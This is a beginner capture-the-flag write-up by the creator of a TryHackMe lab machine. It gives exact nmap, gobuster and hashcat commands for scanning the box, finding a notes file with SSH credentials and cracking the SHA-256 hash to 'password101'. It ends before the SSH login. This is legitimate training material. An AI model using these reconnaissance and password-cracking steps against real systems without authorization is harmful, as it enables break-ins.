---
title: Chewie Writeup [TryHackMe]
published: true
---

# [](#header)Intro

This is actually my first ever VM i created and i hope it was an enjoyable machine for all of you to try :DD.

I design this room to be easy for beginners and more importantly i hope all of you enjoy.

Okay let's just get into hacking!!

<a href="">
link to thm
</a>

# [](#header)Enumeration

We start with nmap scan :

### nmap -sC -sV -oN nmap 192.168.100.11

- -sC : Equivalent to --script=default
- -sV : Probe open ports to determine service/version info
- -oN : Output scan in normal

```bash

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 17:34 WIB
Nmap scan report for 192.168.100.11
Host is up (0.00030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 08:ff:e3:9c:9a:a7:56:3e:2e:bd:fc:e3:63:06:ba:10 (RSA)
|   256 3a:d9:57:b2:70:af:03:2f:7a:0d:d1:97:d6:14:d1:7b (ECDSA)
|_  256 6b:74:b3:9c:2a:1a:da:f8:05:0d:83:f9:8c:85:d5:48 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Chewwie
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.55 seconds

```

We only have 2 ports open: 80 for Apache and 22 for SSH.

Visiting the webserver we get the following page:

![](../assets/images/chewie_thm/web_page.png)

We can try to do directory scan with gobuster and add txt extension:

### gobuster dir -u http://192.168.100.11/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt

- dir : Uses directory/file brutceforcing mode
- -w : Path to the wordlist
- -u : To specify the url

```bash

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.100.11/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/06/16 18:03:21 Starting gobuster
===============================================================
/images (Status: 301)
/manual (Status: 301)
/javascript (Status: 301)
/notes.txt (Status: 200)
Progress: 14310 / 220561 (6.49%)
```

We found `notes.txt` and inside we found a username and password for ssh.

![](../assets/images/chewie_thm/note.png)

But the password was hashed and we have to crack it. There's a lot of ways of cracking password, but here i will use hashcat to crack the hash:

### hashcat -a 0 -m 1400 '5c773b22ea79d367b38810e7e9ad108646ed62e231868cefb0b1280ea88ac4f0' /opt/wordlist/rockyou.txt

- -a : --attack-mode (0 for Straight mode)
- -m : --hash-type (1400 for sha256)

```bash
Dictionary cache hit:
* Filename..: /opt/wordlist/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5c773b22ea79d367b38810e7e9ad108646ed62e231868cefb0b1280ea88ac4f0:password101

Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA2-256
Hash.Target......: 5c773b22ea79d367b38810e7e9ad108646ed62e231868cefb0b...8ac4f0
Time.Started.....: Tue Jun 16 18:39:43 2020 (1 sec)
Time.Estimated...: Tue Jun 16 18:39:44 2020 (0 secs)
Guess.Base.......: File (/opt/wordlist/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    76479 H/s (3.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 24576/14344385 (0.17%)
Rejected.........: 0/24576 (0.00%)
Restore.Point....: 20480/14344385 (0.14%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: michael! -> 280789

Started: Tue Jun 16 18:39:01 2020
Stopped: Tue Jun 16 18:39:46 2020
```

A few minutes later the password was CRACKED!!

After that we can ssh to the machine with the user we found and the password we crack:
